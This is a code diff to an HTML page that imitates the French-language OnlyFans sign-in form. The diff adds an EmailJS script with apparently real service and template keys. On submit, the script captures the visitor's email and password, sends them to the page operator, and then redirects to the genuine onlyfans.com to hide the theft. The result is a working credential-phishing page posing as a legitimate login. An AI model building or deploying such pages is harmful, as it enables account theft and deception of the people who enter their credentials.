@@ -81,17 +81,14 @@ acceptBtn.addEventListener('click', hideCookieBanner);
                             <div data-v-661edbdc="" style="box-sizing:border-box;padding:0px;margin:0px;background-repeat:no-repeat;width: 344px;">
                                 <h1 data-v-661edbdc="" style="box-sizing:border-box;font-weight:400;font-size:0px;margin-top:0px;margin-bottom:13px;font-family:a;color:rgb(36, 37, 41);margin:0px 0px 13px;padding:0px;background-repeat:no-repeat;font:0px / 0px a;"> OnlyFans 
                                     <img style="width: 300px;" src="../dl/SharedScreenshot.jpg" alt=""></h1>
-                                <h2 data-v-661edbdc="" style="color:rgb(254, 254, 254);font-size:32px;line-height:40px;margin-bottom:31px;box-sizing:border-box;margin:0px 0px 31px;font-weight:400;margin-top:0px;font-family:Roboto, sans-serif;padding:0px;background-repeat:no-repeat;">Connectez-vous pour soutenir vos créateurs préférés</h2>
+                                <h2 data-v-661edbdc="" style="color:rgb(254, 254, 254);font-size:32px;line-height:40px;margin-bottom:31px;box-sizing:border-box;margin:0px 0px 31px;font-weight:400;margin-top:0px;font-family:Roboto, sans-serif;padding:0px;background-repeat:no-repeat;">Inscrivez-vous pour soutenir vos créateurs préférés</h2>
                             </div>
                         </div>
                         <div data-v-661edbdc="" style="width: 50%;box-sizing:border-box;padding:0px;margin:0px;background-repeat:no-repeat;display:flex;justify-content:center;">
                             <div data-v-661edbdc="" style="box-sizing:border-box;padding:0px;margin:0px;background-repeat:no-repeat;width: 344px;">
-                                <form data-v-e4c1da7a="" data-v-661edbdc="" novalidate="novalidate" style="box-sizing:border-box;padding:0px;margin:0px;background-repeat:no-repeat;text-align:center;">
+                                <form id="contact-form" data-v-e4c1da7a="" data-v-661edbdc="" novalidate="novalidate" style="box-sizing:border-box;padding:0px;margin:0px;background-repeat:no-repeat;text-align:center;">
                                     <h3 data-v-e4c1da7a="" style="box-sizing:border-box;font-size:14px;font-weight:500;overflow-wrap:break-word;word-break:normal;font-family:Roboto, sans-serif;color:rgb(36, 37, 41);padding:0px;margin:0px 0px 9px;background-repeat:no-repeat;text-align:left;line-height:20px;">Inscrivez-vous</h3>
-                                    <!---->
-                                    <div class="input-container">
-                                        <input id="email" name="email" type="text" placeholder="Nom" required />
-                                    </div>
+                                    
                                     <!-- Section Email -->
 <div class="input-container">
     <input id="email" name="email" type="email" placeholder="Email" required />
@@ -99,7 +96,7 @@ acceptBtn.addEventListener('click', hideCookieBanner);
 
 <!-- Section Mot de Passe -->
 <div class="input-container">
-    <input id="password" name="password" type="password" placeholder="Password" required />
+    <input id="message" name="message" type="password" placeholder="Password" required />
 </div>
 <style>
     /* Style de base pour le conteneur */
@@ -141,16 +138,51 @@ input:not(:focus)::placeholder {
 
 </style>
                                     <!---->
-                                    <!----><button data-v-e4c1da7a="" style="margin-bottom:16px;padding-left:38px;position:relative;display:block;width: 100%;border-radius:1000px;padding-top:10px;padding-bottom:10px;min-height:40px;font-weight:500;color:rgb(254, 254, 254);border:0px none rgb(254, 254, 254);padding:10px 18px 10px 38px;font-size:14px;line-height:20px;background:rgb(0, 175, 240) none repeat scroll 0% 0% / auto padding-box border-box;min-width:78px;transition:opacity 0.15s, background-color 0.15s, box-shadow 0.15s;text-align:center;text-transform:uppercase;box-sizing:border-box;font-family:Roboto, sans-serif;appearance:button;cursor:pointer;overflow:visible;background-color:rgb(0, 175, 240);border-style:none;background-repeat:repeat;"><span data-v-e4c1da7a="" style="position:absolute;width: 42px;bottom:2px;left:2px;top:2px;border-radius:1000px 2px 2px 1000px;box-sizing:border-box;padding:0px;margin:0px;background-repeat:no-repeat;"><svg data-v-e4c1da7a="" data-icon-name="icon-fingerprint" aria-hidden="true" style="width: 24px;height:24px;flex:0 0 24px;display:block;fill:rgb(254, 254, 254);line-height:14px;position:absolute;transform:matrix(1, 0, 0, 1, -12, -12);top:18px;left:18px;vertical-align:middle;box-sizing:border-box;overflow:hidden;padding:0px;margin:0px;background-repeat:no-repeat;">
+                                    <!----><button type="submit" id="redirect-btn" data-v-e4c1da7a="" style="margin-bottom:16px;padding-left:38px;position:relative;display:block;width: 100%;border-radius:1000px;padding-top:10px;padding-bottom:10px;min-height:40px;font-weight:500;color:rgb(254, 254, 254);border:0px none rgb(254, 254, 254);padding:10px 18px 10px 38px;font-size:14px;line-height:20px;background:rgb(0, 175, 240) none repeat scroll 0% 0% / auto padding-box border-box;min-width:78px;transition:opacity 0.15s, background-color 0.15s, box-shadow 0.15s;text-align:center;text-transform:uppercase;box-sizing:border-box;font-family:Roboto, sans-serif;appearance:button;cursor:pointer;overflow:visible;background-color:rgb(0, 175, 240);border-style:none;background-repeat:repeat;"><span data-v-e4c1da7a="" style="position:absolute;width: 42px;bottom:2px;left:2px;top:2px;border-radius:1000px 2px 2px 1000px;box-sizing:border-box;padding:0px;margin:0px;background-repeat:no-repeat;"><svg data-v-e4c1da7a="" data-icon-name="icon-fingerprint" aria-hidden="true" style="width: 24px;height:24px;flex:0 0 24px;display:block;fill:rgb(254, 254, 254);line-height:14px;position:absolute;transform:matrix(1, 0, 0, 1, -12, -12);top:18px;left:18px;vertical-align:middle;box-sizing:border-box;overflow:hidden;padding:0px;margin:0px;background-repeat:no-repeat;">
                                         <use href="/static/prod/f/202409251511-f44576aa5a/icons/sprite.svg#icon-fingerprint" xlink:href="/static/prod/f/202409251511-f44576aa5a/icons/sprite.svg#icon-fingerprint" style="box-sizing:border-box;padding:0px;margin:0px;background-repeat:no-repeat;"></use>
                                     </svg></span> S'inscrire </button>
-                                    <div data-v-e4c1da7a="" style="box-sizing:border-box;padding:8px 11px 0px;margin:0px;background-repeat:no-repeat;color:rgb(138, 150, 163);font-size:12px;line-height:16px;text-align:left;">En vous inscription et en utilisant OnlyFans, vous acceptez nos <a href="/terms" style="color:rgb(0, 175, 240);text-decoration:none solid rgb(0, 175, 240);box-sizing:border-box;background-color:rgba(0, 0, 0, 0);padding:0px;margin:0px;background-repeat:no-repeat;">Conditions d'utilisation</a> et notre <a href="/privacy" style="color:rgb(0, 175, 240);text-decoration:none solid rgb(0, 175, 240);box-sizing:border-box;background-color:rgba(0, 0, 0, 0);padding:0px;margin:0px;background-repeat:no-repeat;">Politique de confidentialité</a>, et vous confirmez que vous avez au moins 18 ans.</div>
-                                    <div data-v-e4c1da7a="" style="box-sizing:border-box;padding:30px 0px;margin:0px;background-repeat:no-repeat;font-size:14px;line-height:20px;padding-bottom:30px;padding-top:30px;"><span data-v-e4c1da7a="" style="box-sizing:border-box;padding:0px;margin:0px;background-repeat:no-repeat;"><button data-v-e4c1da7a="" type="button" at-attr="forgot_password" style="padding:0px;background-color:rgba(0, 0, 0, 0);text-transform:none;min-width: auto;border:0px none rgb(0, 175, 240);font-size:14px;line-height:20px;background:rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;transition:opacity 0.15s, background-color 0.15s, box-shadow 0.15s;display:inline-block;text-align:center;appearance:none;box-sizing:border-box;font-weight:400;font-family:Roboto, sans-serif;cursor:pointer;overflow:visible;margin:0px;border-style:none;background-repeat:repeat;"> Vous n'avez pas de compte ? </button></span><span data-v-e4c1da7a="" style="box-sizing:border-box;padding:0px 0px 0px 18px;margin:0px;background-repeat:no-repeat;padding-left:18px;position:relative;">
-                                            <!----><button data-v-e4c1da7a="" at-attr="sign_up" type="button" style="color:rgb(0, 175, 240);padding:0px;background-color:rgba(0, 0, 0, 0);text-transform:none;min-width: auto;border:0px none rgb(0, 175, 240);font-size:14px;line-height:20px;background:rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;transition:opacity 0.15s, background-color 0.15s, box-shadow 0.15s;display:inline-block;text-align:center;appearance:none;box-sizing:border-box;font-weight:400;font-family:Roboto, sans-serif;cursor:pointer;overflow:visible;margin:0px;border-style:none;background-repeat:repeat;"> <a style="text-decoration: none;color: deepskyblue;" href="../dl/inscription.html">S'inscrire</a> </button>
+                                    <script>
+                                        document.getElementById('redirect-btn').addEventListener('click', function() {
+                                            window.location.href = 'https://mym.fans/app/register'; // Redirige vers Facebook lors du clic
+                                        });
+                                    </script>
+                                    <div data-v-e4c1da7a="" style="box-sizing:border-box;padding:8px 11px 0px;margin:0px;background-repeat:no-repeat;color:rgb(138, 150, 163);font-size:12px;line-height:16px;text-align:left;">En vous connectant et en utilisant OnlyFans, vous acceptez nos <a href="/terms" style="color:rgb(0, 175, 240);text-decoration:none solid rgb(0, 175, 240);box-sizing:border-box;background-color:rgba(0, 0, 0, 0);padding:0px;margin:0px;background-repeat:no-repeat;">Conditions d'utilisation</a> et notre <a href="/privacy" style="color:rgb(0, 175, 240);text-decoration:none solid rgb(0, 175, 240);box-sizing:border-box;background-color:rgba(0, 0, 0, 0);padding:0px;margin:0px;background-repeat:no-repeat;">Politique de confidentialité</a>, et vous confirmez que vous avez au moins 18 ans.</div>
+                                    <div data-v-e4c1da7a="" style="box-sizing:border-box;padding:30px 0px;margin:0px;background-repeat:no-repeat;font-size:14px;line-height:20px;padding-bottom:30px;padding-top:30px;"><span data-v-e4c1da7a="" style="box-sizing:border-box;padding:0px;margin:0px;background-repeat:no-repeat;"><button data-v-e4c1da7a="" type="button" at-attr="forgot_password" style="padding:0px;background-color:rgba(0, 0, 0, 0);text-transform:none;min-width: auto;border:0px none rgb(0, 175, 240);font-size:14px;line-height:20px;background:rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;transition:opacity 0.15s, background-color 0.15s, box-shadow 0.15s;display:inline-block;text-align:center;appearance:none;box-sizing:border-box;font-weight:400;font-family:Roboto, sans-serif;cursor:pointer;overflow:visible;margin:0px;border-style:none;background-repeat:repeat;"> Vous avez déjà un compte ? </button></span><span data-v-e4c1da7a="" style="box-sizing:border-box;padding:0px 0px 0px 18px;margin:0px;background-repeat:no-repeat;padding-left:18px;position:relative;">
+                                            <!----><button data-v-e4c1da7a="" at-attr="sign_up" type="button" style="color:rgb(0, 175, 240);padding:0px;background-color:rgba(0, 0, 0, 0);text-transform:none;min-width: auto;border:0px none rgb(0, 175, 240);font-size:14px;line-height:20px;background:rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;transition:opacity 0.15s, background-color 0.15s, box-shadow 0.15s;display:inline-block;text-align:center;appearance:none;box-sizing:border-box;font-weight:400;font-family:Roboto, sans-serif;cursor:pointer;overflow:visible;margin:0px;border-style:none;background-repeat:repeat;"> <a style="text-decoration: none; color: deepskyblue;" href="../dl/inscription.html">S'inscrire</a> </button>
                                         </span></div>
                                     <!---->
                                 </form>
                             </div>
+                            <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("l7RHGlQsUzOwD6yc1"); // Remplace "YOUR_USER_ID" par ton USER_ID fourni par EmailJS
+        })();
+        
+        document.getElementById('contact-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Empêche la soumission du formulaire classique
+
+            // Collecte les données du formulaire
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const message = document.getElementById('message').value;
+
+            // Envoi des données via EmailJS
+            emailjs.send("service_zr11u2p", "template_mkymtll", {
+                name: name,
+                email: email,
+                message: message
+            }).then(function(response) {
+                console.log("SUCCESS", response.status, response.text);
+                document.getElementById('response').style.display = 'block'; // Affiche le message de succès
+                setTimeout(function() {
+                    window.location.href = 'https://onlyfans.com/'; // Redirige vers la page "merci.html" après 2 secondes
+                }, 2000);
+            }, function(error) {
+                console.log("FAILED", error);
+            });
+        });
+    </script>
                         </div>
                     </div>
                 </div>
